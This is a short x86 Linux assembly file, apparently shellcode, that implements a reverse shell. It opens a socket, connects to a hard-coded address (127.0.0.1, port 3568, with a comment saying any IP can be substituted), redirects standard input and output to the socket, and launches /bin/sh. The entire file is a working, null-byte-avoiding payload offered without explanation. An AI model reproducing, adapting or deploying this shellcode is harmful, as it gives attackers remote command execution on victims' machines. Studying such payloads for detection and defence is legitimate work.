global _start

section .text

_start:
;socket
xor ebx, ebx	;zero ebx
mul ebx		;zero eax
push edx	;0
inc ebx		;socket()
push ebx	;1
push byte 0x2	;2
mov ecx, esp	;move argument ptr to ecx
mov al, 0x66	;syscall socketcall
int 0x80	;socket()

;dup2
xchg ebx, eax 	;eax = 2, ebx = fd
pop ecx 	;2

;connect stack prepare
push 0x0100007f		;only nulls in 127.0.0.1. This can be changed to any IP
push word 0xf00d	;3568
push word cx		;af_inet

dup2:
	mov al, 0x3f	;dup2
	int 0x80
	dec ecx
	jns dup2

;connect continue stack prepare
mov ecx, esp		;move arg ptr to ecx
push byte 0x10
push ecx		;ptr to arg ptr (ecx)
push ebx		;fd
mov ecx, esp
mov al, 0x66
int 0x80

;execve
push edx	;0
push 0x68732f6e	;"n/sh"
push 0x69622f2f	;"//bi"
xor ecx, ecx
mov ebx, esp	;move argument ptr to ebx
mov al, 0xb	;execve()
int 0x80
